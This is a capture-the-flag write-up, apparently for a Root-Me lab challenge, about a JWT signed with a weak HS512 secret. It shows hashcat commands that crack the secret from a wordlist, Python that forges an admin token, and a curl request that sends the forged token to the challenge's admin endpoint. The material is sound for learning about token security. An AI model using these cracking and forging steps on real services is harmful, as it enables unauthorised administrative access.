# JWT - Weak Secret

## Statement :

This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you.

Manage to recover its most valuable secrets!

## Analysis

![Main page](../../assets/rootme/Web-Server/jwt-weak-secret/main-page.png)

We land on a simple page at `/hello`. There's no login form this time, just an endpoint to grab a token. Navigating to `/token`, we receive a JWT.

![Token page](../../assets/rootme/Web-Server/jwt-weak-secret/token-page.png)

Let's decode it using [jwt.io](https://jwt.io):

![Decoded Token](../../assets/rootme/Web-Server/jwt-weak-secret/decoded-token.png)

The token structure is:

- **Header**: {"typ": "JWT", "alg": "HS512"}, the token is signed with HMAC-SHA512.
- **Payload**: {"role": "guest"}, our current role.

The challenge title, *Weak Secret*, tells us the attack vector: the signing secret is weak enough to be cracked by brute force.

## Exploit

Since the secret is weak, we can brute-force it. We grab the token from `/token`, save it to a file and crack it with **hashcat**:

```bash
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

The secret is cracked almost instantly : `lol`

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw:lol
```

Now we can forge a new token with role set to admin and sign it with the cracked secret:

```python
import jwt

forged = jwt.encode({"role": "admin"}, "lol", algorithm="HS512")
print(forged)
```

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg
```

As we were told, we try to access `/admin` with a post request using our now token :

```bash
curl -X POST \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg" \
  http://challenge01.root-me.org/web-serveur/ch59/admin
```

```
{"result": "Congrats!! Here is your flag: *************************"}
```